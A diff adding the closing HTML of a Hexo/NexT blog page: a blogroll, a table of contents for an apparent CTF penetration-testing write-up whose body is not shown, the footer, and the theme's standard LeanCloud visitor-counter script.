+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.izilong.net/" title="Zilong" target="_blank">Zilong</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://iwenhu.cn/" title="Mengchen" target="_blank">Mengchen</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://keysking.github.io/" title="Keysking" target="_blank">Keysking</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://lanvnal.com/" title="LANVNAL" target="_blank">LANVNAL</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wsimp1er.com/" title="Simp1er" target="_blank">Simp1er</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#No-8-看视频真嗨皮（读：50分，写：100分）"><span class="nav-number">1.</span> <span class="nav-text">#No.8 看视频真嗨皮（读：50分，写：100分）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#No-23-找入口（读：100分，写：200分）"><span class="nav-number">2.</span> <span class="nav-text">#No.23 找入口（读：100分，写：200分）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第三轮"><span class="nav-number"></span> <span class="nav-text">第三轮</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00信息收集"><span class="nav-number">0.1.</span> <span class="nav-text">0x00信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#FLAG值"><span class="nav-number">0.1.1.</span> <span class="nav-text">FLAG值</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01信息分析"><span class="nav-number">0.2.</span> <span class="nav-text">0x01信息分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#操作内容"><span class="nav-number">0.2.1.</span> <span class="nav-text">操作内容</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FLAG值-1"><span class="nav-number">0.2.2.</span> <span class="nav-text">FLAG值</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02开始渗透"><span class="nav-number">0.3.</span> <span class="nav-text">0x02开始渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#操作内容-1"><span class="nav-number">0.3.1.</span> <span class="nav-text">操作内容</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FLAG值-2"><span class="nav-number">0.3.2.</span> <span class="nav-text">FLAG值</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2017.3 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Windylh</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("G38Wjo4XURoegldByMbpMI2C-gzGzoHsz", "PAvMrVY87vPwX9PBcMLfYmw4");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
